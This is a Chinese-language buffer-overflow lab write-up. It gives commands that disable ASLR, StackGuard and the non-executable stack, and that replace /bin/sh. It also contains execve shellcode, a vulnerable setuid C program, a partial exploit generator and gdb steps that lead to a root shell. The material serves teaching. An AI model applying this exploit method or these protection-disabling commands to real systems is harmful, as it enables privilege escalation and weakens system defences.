# Buffer-Overflow Vulnerability Lab
实验环境:Ubuntu 16.04
缓冲区溢出漏洞
> 本实验的学习目标是让学生通过将他们从课堂上学到的有关漏洞的知识付诸实践，获得有关缓冲区溢出漏洞的第一手经验。缓冲区溢出被定义为程序试图在预分配的固定长度缓冲区的边界之外写入数据的条件。恶意用户可以利用此漏洞来更改程序的流控制，甚至执行任意代码。**此漏洞的出现是由于数据存储（例如缓冲区）和控件存储（例如返回地址）的混合：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。**

> 向学生提供了一个存在缓冲区溢出问题的程序，他们需要利用此漏洞来获取root特权。

## 实验预览
该实验室的学习目标是让学生通过将他们从课堂上学到的有关漏洞的知识付诸实践，获得有关缓冲区溢出漏洞的第一手经验。缓冲区溢出被定义为程序试图在预分配的固定长度缓冲区的边界之外写入数据的条件。恶意用户可以使用此漏洞来更改程序的流控制，从而导致执行恶意代码。此漏洞的出现是由于数据存储（例如缓冲区）和控件存储（例如返回地址）的混合：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。

在本实验中，将为学生提供一个具有缓冲区溢出漏洞的程序；他们的任务是开发一种利用该漏洞并最终获得root特权的方案。除攻击外，还将指导学生逐步介绍几种已在操作系统中实施的保护方案，以**应对缓冲区溢出攻击**。学生需要评估该计划是否有效，并解释原因。本实验涵盖以下主题：
- Buffer overflow vulnerability and attack 缓冲区溢出漏洞和攻击
- Stack layout in a function invocation 函数调用中的堆栈布局
- Shellcode shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。
- Address randomization 地址随机化
- Non-executable stack 不可执行的堆栈
- StackGuard 堆栈保护

## 实验任务
### 关闭对策 Turning Off Countermeasures
Ubuntu和其他Linux发行版已经实现了几种安全机制，以使缓冲区溢出攻击变得困难。

为了简化攻击，我先禁用它们。然后再我们将一一启用它们，并查看我们的攻击是否仍然可以成功。

**地址空间随机化**： Ubuntu和其他几个基于Linux的系统使用地址空间随机化来随机化堆和栈的起始地址。这使得猜测确切的地址变得困难。猜测地址是缓冲区溢出攻击的关键步骤之一。在本实验中，我们使用以下命令禁用此功能：
```shell
$ sudo sysctl -w kernel.randomize_va_space=0
```

**StackGuard保护方案**：  GCC编译器实现了一种称为StackGuard的安全机制，以防止缓冲区溢出。在这种保护的情况下，缓冲区溢出攻击将不起作用。我们可以在编译期间使用`-fno-stack-protector`选项禁用此保护。例如，要在禁用StackGuard的情况下编译程序`example.c`，我们可以执行以下操作：
```shell
$ gcc -fno-stack-protector example.c
```

**不可执行的堆栈**： Ubuntu曾经允许可执行堆栈，但是现在已经发生了变化：程序（和共享库）的二进制映像必须声明它们是否需要可执行堆栈，即它们需要在程序标头中标记一个字段。内核或动态链接器使用此标记来决定是使此正在运行的程序的堆栈是可执行的还是不可执行的。标记是由最新版本的gcc自动完成的，默认情况下，堆栈设置为不可执行。要更改此设置，请在编译程序时使用以下选项：

`对于可执行堆栈：`
```shell
$ gcc -z execstack -o test test.c
```
`对于不可执行堆栈`
```shell
$ gcc -z noexecstack -o test test.c
```

**配置 `/bin/sh` **:  在Ubuntu 12.04和Ubuntu 16.04 VM中，`/bin/sh` 符号链接均指向`/bin/dash` shell。但是，这两个VM中的`dash`程序有重要区别。Ubuntu 16.04中的`dash` shell 有一个对策，可防止自身在`Set-UID`进程中执行。基本上，如果`dash`检测到它是在`Set-UID`进程中执行的，它将立即将有效用户ID更改为该进程的真实用户ID，从而实质上删除了特权。Ubuntu 12.04中的`dash`程序没有此行为。

由于我们的受害者程序是Set-UID程序，并且我们的攻击依赖于运行`/bin/sh`，因此`/bin/dash`中的对策使我们的攻击更加困难。因此，我们将`/bin/sh`链接到另一个没有这种对策的`Shell`程序（在以后的任务中，我们将展示出一点点的努力，就可以轻易克服`/bin/dash`中的对策）。我们已经在Ubuntu 16.04 VM中安装了名为`zsh`的`Shell`程序。我们使用以下命令将`/bin/sh`链接到zsh
```shell
$ sudo rm /bin/sh
$ sudo ln -s /bin/zsh /bin/sh
```

### 任务一 运行shell代码
在开始攻击之前，让我们熟悉一下shellcode。Shellcode是启动Shell的代码，必须将其加载到**内存**中，以便我们可以迫使易受攻击的程序跳转至该内存。考虑以下程序：
```c
#include<stdio.h>

int main()
{
    char* name[2];
    name[0]= "/bin/sh";
    name[1]=NULL;
    execve(name[0],name,NULL);
}
```
我们使用的shellcode只是上述程序的汇编版本。以下程序显示了如何通过执行存储在缓冲区中的shellcode来启动shell。请编译并运行以下代码，并查看是否调用了shell。您可以从网站下载程序。
```c
/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
} 
```
使用以下`gcc`命令编译以上代码。运行程序并描述您的观察结果。请不要忘记使用`execstack`选项，该选项允许从堆栈执行代码。没有此选项，程序将失败。

```shell
$ gcc -z execstack -o call_shellcode call_shellcode.c
```
上面的shellcode调用execve()系统调用来执行/bin/sh。此shellcode中的一些地方值得一提。

**首先**，第三条指令将“//sh”而不是“/sh”压入堆栈。这是因为我们在这里需要一个32位数字，而“/sh”只有24位。幸运的是，“//”等效于“/”，因此我们可以避免使用双斜杠符号。

**其次**，在调用execve()系统调用之前，我们需要将name[0]（字符串的地址），name（数组的地址）和NULL分别存储到％ebx，％ecx和％edx寄存器中。第5行将name [0]存储到％ebx；第8行将名称存储到％ecx；第9行将％edx设置为零。还有其他方法可以将％edx设置为零(例如xorl％edx，％edx)； 这里使用的那个(cdq)只是一条较短的指令：它将EAX寄存器中的值的符号（第31位）（此时为0）复制到EDX寄存器的每个位位置，基本上将％edx设置为 0.

**第三**，当我们将％al设置为11并执行“ int $ 0x80”时，系统调用execve()被调用。

### 易受攻击的程序
将为您提供以下程序，该程序在Line➀中具有缓冲区溢出漏洞。您的工作是利用此漏洞并获得root特权。
```c
/* stack.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[24];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
```

编译上述易受攻击的程序。不要忘记包括`-fno-stack-protector`和“`-z execstack`”选项，以关闭StackGuard和不可执行的堆栈保护。编译之后，我们需要使该程序成为root拥有的Set-UID程序。我们可以通过首先将程序的所有权更改为`root`（第Line行），然后将权限更改为`4755`以启用Set-UID位（第Line）来实现此目的。

应当注意，更改所有权必须在开启Set-UID位之前完成，因为所有权更改将导致Set-UID位被关闭。

```shell
$ gcc -g -o stack -z execstack -fno-stack-protector stack.c //必须要有-g才可以被检测到
$ sudo chown root stack ①
$ sudo chmod 4755 stack ②
```
上面的程序有一个缓冲区溢出漏洞。它首先从名为`badfile`的文件中读取输入，然后将该输入传递到函数`bof()`中的另一个缓冲区。原始输入的最大长度可以为`517个字节`，但是`bof()`中的缓冲区只有`24个字节`长。由于`strcpy()`不检查边界，因此会发生缓冲区溢出。由于此程序是`Set-root-UID`程序，因此，如果普通用户可以利用此缓冲区溢出漏洞，则普通用户可能能够获得root shell。应当注意，程序从名为`badfile`的文件获取其输入。该文件受用户控制。现在，我们的目标是为`badfile`创建内容，以便当易受攻击的程序将内容复制到其缓冲区中时，可以生成`根shell`。

### 任务二 利用漏洞
我们为您提供了部分完成的利用代码，称为`“exploit.c”`。该代码的目的是为badfile构造内容。在此代码中，`shellcode`提供给您。您需要开vi e发其余部分。

```c
/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */ 
    strcpy(buffer+100,shellcode);			//将shellcode拷贝至buffer
    strcpy(buffer+0x24,"\x??\x??\x??\x??");		//在buffer特定偏移处起始的四个字节覆盖sellcode地址
    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

完成上述程序后，编译并运行它。这将生成`badfile`的内容。然后运行易受攻击的程序`stack.c`。如果您的漏洞利用程序正确实施，则应该能够获得`root shell`： 

那么我们这里就存在一个问题(这里是重点)，应该怎么得到这里偏移的位置呢？一下内容参考[博客](https://blog.csdn.net/xxx_qz/article/details/62889756)

于是我们想到可以使用gdb来调试一下`stack.c`看一下内部运行的结构，首先这里需要强调一下必须在gcc编译时加上`-g`选项才可以使用gdb调试。

在终端输入如下代码：
```shellcode
$ gdb stack 
```
然后就进入了调试的页面，然后就可以看一下shellcode的返回地址。
```shellcode
$ b main
$ r //查看寄存器
$ p /x &str
```
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTg0MDQ4OC0xMzI5ODkyNDc5LnBuZw?x-oss-process=image/format,png)

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTg1MTE3OC00MjA5NTE5NjgucG5n?x-oss-process=image/format,png)


漏洞程序读取badfile 文件到缓冲区str，且str的地址为0xbfffeb17，计算上shellcode偏移量100（0x64）,则shellcode地址为0xbffeb7b

然后接下来输入如下命令进行反汇编，可以看到ebp的首地址偏移量为0x20，则由于是32bit的字节，所以返回地址偏移为0x24。

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTkyNjgzMS0xNTM2NDAyNDcyLnBuZw?x-oss-process=image/format,png)


**重要提示**：请首先编译您的易受攻击的程序。请注意，生成`badfile`的程序`exploit.c`可以在启用默认StackGuard保护的情况下进行编译。这是因为我们不会在该程序中溢出缓冲区。我们将溢出`stack.c`中的缓冲区，该缓冲区是在禁用StackGuard保护的情况下编译的。


```shell
$ gcc -o exploit exploit.c
$./exploit // create the badfile
$./stack // launch the attack by running the vulnerable program
# <---- Bingo! You’ve got a root shell!
```

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTg1ODQ5NC8yMDE5MTEvMTg1ODQ5NC0yMDE5MTEyMzIyNTk0Njc2NC02NzMyMjM3NjAucG5n?x-oss-process=image/format,png)